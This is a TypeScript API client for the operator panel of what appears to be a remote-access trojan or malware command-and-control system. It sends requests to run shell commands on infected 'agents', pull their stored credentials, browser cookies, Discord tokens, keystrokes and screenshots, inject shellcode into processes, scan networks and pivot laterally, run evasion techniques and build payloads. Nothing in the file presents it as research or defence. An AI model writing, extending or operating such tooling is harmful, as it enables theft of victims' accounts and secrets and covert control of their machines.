import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module, PayloadConfig, BuildResult } from '@/types'

const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8080'
const WS_BASE = import.meta.env.VITE_WS_BASE || 'ws://localhost:8081'

class ApiClient {
  private token: string | null = null
  private ws: WebSocket | null = null
  private messageHandlers: Map<string, Set<(data: any) => void>> = new Map()
  private reconnectAttempts = 0
  private maxReconnectAttempts = 5
  private reconnectDelay = 1000
  private agentId: string | null = null

  setToken(token: string | null) {
    this.token = token
    if (token) {
      localStorage.setItem('auth_token', token)
    } else {
      localStorage.removeItem('auth_token')
    }
  }

  getToken(): string | null {
    if (!this.token) {
      this.token = localStorage.getItem('auth_token')
    }
    return this.token
  }

  private async request<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
    const token = this.getToken()
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(options.headers as Record<string, string>),
    }
    if (token) {
      headers['Authorization'] = `Bearer ${token}`
    }

    const response = await fetch(`${API_BASE}${endpoint}`, {
      ...options,
      headers,
    })

    if (response.status === 401) {
      this.setToken(null)
      window.location.href = '/login'
      throw new Error('Unauthorized')
    }

    if (!response.ok) {
      const error = await response.json().catch(() => ({ message: 'Request failed' }))
      throw new Error(error.message || 'Request failed')
    }

    return response.json()
  }

  // Auth
  async login(username: string, password: string): Promise<{ token: string; user: { username: string } }> {
    const result = await this.request<{ token: string; user: { username: string } }>('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    })
    this.setToken(result.token)
    return result
  }

  async register(username: string, password: string): Promise<{ token: string; user: { username: string } }> {
    const result = await this.request<{ token: string; user: { username: string } }>('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    })
    this.setToken(result.token)
    return result
  }

  // Agents
  async getAgents(): Promise<Agent[]> {
    return this.request<Agent[]>('/api/agents')
  }

  async getAgent(id: string): Promise<Agent> {
    return this.request<Agent>(`/api/agents/${id}`)
  }

  async deleteAgent(id: string): Promise<void> {
    return this.request<void>(`/api/agents/${id}`, { method: 'DELETE' })
  }

  // Tasks
  async getTasks(agentId: string): Promise<Task[]> {
    return this.request<Task[]>(`/api/agents/${agentId}/tasks`)
  }

  async executeShell(agentId: string, command: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/shell`, {
      method: 'POST',
      body: JSON.stringify({ command }),
    })
  }

  async takeScreenshot(agentId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/screenshot`, {
      method: 'POST',
    })
  }

  async sleep(agentId: string, seconds: number): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/sleep`, {
      method: 'POST',
      body: JSON.stringify({ seconds }),
    })
  }

  async uninstall(agentId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/uninstall`, {
      method: 'POST',
    })
  }

  async updateAgentBinary(agentId: string, url: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/update`, {
      method: 'POST',
      body: JSON.stringify({ url }),
    })
  }

  // File Transfers
  async getFileTransfers(agentId: string): Promise<FileTransfer[]> {
    return this.request<FileTransfer[]>(`/api/agents/${agentId}/files`)
  }

  async downloadFile(agentId: string, path: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/files/download`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    })
  }

  async uploadFile(agentId: string, path: string, data: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/files/upload`, {
      method: 'POST',
      body: JSON.stringify({ path, data }),
    })
  }

  async listDirectory(agentId: string, path: string): Promise<{ files: FileTransfer[] }> {
    return this.request<{ files: FileTransfer[] }>(`/api/agents/${agentId}/files/list`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    })
  }

  // Credentials
  async getCredentials(agentId: string): Promise<Credential[]> {
    return this.request<Credential[]>(`/api/agents/${agentId}/credentials`)
  }

  // Cookies
  async getCookies(agentId: string): Promise<Cookie[]> {
    return this.request<Cookie[]>(`/api/agents/${agentId}/cookies`)
  }

  // Discord Tokens
  async getDiscordTokens(agentId: string): Promise<DiscordToken[]> {
    return this.request<DiscordToken[]>(`/api/agents/${agentId}/discord`)
  }

  // Keystrokes
  async getKeystrokes(agentId: string): Promise<Keystroke[]> {
    return this.request<Keystroke[]>(`/api/agents/${agentId}/keystrokes`)
  }

  // Screenshots
  async getScreenshots(agentId: string): Promise<Screenshot[]> {
    return this.request<Screenshot[]>(`/api/agents/${agentId}/screenshots`)
  }

  // Processes
  async getProcesses(agentId: string): Promise<ProcessInfo[]> {
    return this.request<ProcessInfo[]>(`/api/agents/${agentId}/processes`)
  }

  async suspendProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/suspend`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async resumeProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/resume`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async killProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/kill`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async injectProcess(agentId: string, pid: number, shellcode: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/processes/inject`, {
      method: 'POST',
      body: JSON.stringify({ pid, shellcode }),
    })
  }

  // Lateral Movement
  async getLateralMoves(agentId: string): Promise<LateralMove[]> {
    return this.request<LateralMove[]>(`/api/agents/${agentId}/lateral`)
  }

  async scanNetwork(agentId: string, subnet: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/lateral/scan`, {
      method: 'POST',
      body: JSON.stringify({ subnet }),
    })
  }

  async pivotAgent(agentId: string, target: string, technique: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/lateral/pivot`, {
      method: 'POST',
      body: JSON.stringify({ target, technique }),
    })
  }

  // Evasion
  async getEvasionResults(agentId: string): Promise<EvasionAction[]> {
    return this.request<EvasionAction[]>(`/api/agents/${agentId}/evasion`)
  }

  async runEvasion(agentId: string, technique: string, target: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/evasion/run`, {
      method: 'POST',
      body: JSON.stringify({ technique, target }),
    })
  }

  // Modules
  async getModules(agentId: string): Promise<Module[]> {
    return this.request<Module[]>(`/api/agents/${agentId}/modules`)
  }

  async loadModule(agentId: string, moduleId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/modules/load`, {
      method: 'POST',
      body: JSON.stringify({ module_id: moduleId }),
    })
  }

  async unloadModule(agentId: string, moduleId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/modules/unload`, {
      method: 'POST',
      body: JSON.stringify({ module_id: moduleId }),
    })
  }

  // Payload Building
  async buildPayload(config: PayloadConfig): Promise<BuildResult> {
    return this.request<BuildResult>('/api/payloads/build', {
      method: 'POST',
      body: JSON.stringify(config),
    })
  }

  async uploadAgentBinary(file: File, platform: 'windows' | 'linux'): Promise<{ success: boolean; path: string }> {
    const formData = new FormData()
    formData.append('file', file)
    formData.append('platform', platform)

    const token = this.getToken()
    const headers: Record<string, string> = {}
    if (token) {
      headers['Authorization'] = `Bearer ${token}`
    }

    const response = await fetch(`${API_BASE}/api/payloads/upload`, {
      method: 'POST',
      headers,
      body: formData,
    })

    if (!response.ok) {
      const error = await response.json().catch(() => ({ message: 'Upload failed' }))
      throw new Error(error.message || 'Upload failed')
    }

    return response.json()
  }

  // WebSocket
  connectWS(agentId?: string): Promise<void> {
    return new Promise((resolve, reject) => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        resolve()
        return
      }

      this.agentId = agentId || null
      const wsUrl = `${WS_BASE}/ws${agentId ? `?agent_id=${agentId}` : ''}`
      this.ws = new WebSocket(wsUrl)

      this.ws.onopen = () => {
        console.log('WebSocket connected')
        this.reconnectAttempts = 0
        resolve()
      }

      this.ws.onmessage = (event) => {
        try {
          const message = JSON.parse(event.data)
          this.handleMessage(message)
        } catch (error) {
          console.error('Failed to parse WebSocket message:', error)
        }
      }

      this.ws.onclose = () => {
        console.log('WebSocket disconnected')
        this.attemptReconnect()
      }

      this.ws.onerror = (error) => {
        console.error('WebSocket error:', error)
        if (this.reconnectAttempts === 0) {
          reject(error)
        }
      }
    })
  }

  private attemptReconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.log('Max reconnect attempts reached')
      return
    }

    this.reconnectAttempts++
    const delay = this.reconnectDelay * Math.pow(2, this.reconnectAttempts - 1)
    console.log(`Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`)

    setTimeout(() => {
      this.connectWS(this.agentId || undefined).catch(() => {})
    }, delay)
  }

  private handleMessage(message: { type: string; data: any }) {
    const handlers = this.messageHandlers.get(message.type)
    if (handlers) {
      handlers.forEach((handler) => handler(message.data))
    }
  }

  onMessage(type: string, handler: (data: any) => void): () => void {
    if (!this.messageHandlers.has(type)) {
      this.messageHandlers.set(type, new Set())
    }
    this.messageHandlers.get(type)!.add(handler)
    return () => this.offMessage(type, handler)
  }

  offMessage(type: string, handler?: (data: any) => void) {
    if (handler) {
      this.messageHandlers.get(type)?.delete(handler)
    } else {
      this.messageHandlers.delete(type)
    }
  }

  sendMessage(type: string, data: any) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type, data }))
    }
  }

  disconnectWS() {
    if (this.ws) {
      this.ws.close()
      this.ws = null
    }
  }

  isConnected(): boolean {
    return this.ws?.readyState === WebSocket.OPEN
  }
}

export const api = new ApiClient()